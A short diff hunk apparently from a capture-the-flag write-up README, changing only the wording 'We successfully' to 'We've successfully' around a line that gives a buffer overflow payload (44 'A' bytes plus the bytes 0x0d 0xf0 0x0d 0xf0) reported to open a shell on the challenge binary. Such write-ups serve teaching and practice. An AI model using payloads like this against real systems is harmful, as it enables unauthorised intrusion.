@@ -166,7 +166,7 @@ ls
 exploit.py  i_love_food  README.md
 ```
 
-We successfully opened a shell, so the final payload is : `"\x41"*44+"\x0d\xf0\x0d\xf0"`.
+We've successfully opened a shell, so the final payload is : `"\x41"*44+"\x0d\xf0\x0d\xf0"`.
 
 ## Exploit
 
